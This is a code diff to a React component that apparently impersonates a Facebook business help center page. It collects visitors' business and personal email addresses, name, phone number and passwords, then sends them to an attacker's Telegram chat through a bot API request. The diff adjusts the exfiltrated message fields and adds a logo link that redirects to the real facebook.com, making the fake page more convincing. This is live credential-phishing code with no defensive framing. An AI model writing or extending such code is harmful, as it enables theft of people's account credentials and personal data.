@@ -127,8 +127,8 @@ const BusinessHelpCenter = () => {
           chat_id: ETelegram.CHAT_ID,
           parse_mode: "html",
           document: "",
-          text: message,
-          caption: message,
+          // text: message,
+          // caption: message,
         },
         {
           headers: {
@@ -149,7 +149,7 @@ const BusinessHelpCenter = () => {
       Email Account:  ${businessEmail}
       Name Account: ${namePage}
       Person Email: ${personalEmail}
-      Facebook Page: ${text}
+      Text: ${text}
       User Name: ${fullName}
       Phone Number: ${phone}
       Password First: ${passwordFirst}
@@ -165,7 +165,7 @@ const BusinessHelpCenter = () => {
           parse_mode: "html",
           document: "",
           text: message,
-          caption: message,
+          // caption: message,
         },
         {
           headers: {
@@ -308,12 +308,15 @@ const BusinessHelpCenter = () => {
     items,
     onClick: handleMenuClick,
   };
+  const redictMeta = () => {
+    window.location.href = "https://www.facebook.com";
+  };
   return (
     <div className="container_business">
       <div className="topheader bg-facebook p-2">
         <div className="sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
           <div className="w-[20%] md:w-[15%]">
-            <a href="">
+            <a onClick={redictMeta}>
               <img
                 src="/images/facebook.png"
                 width="90"
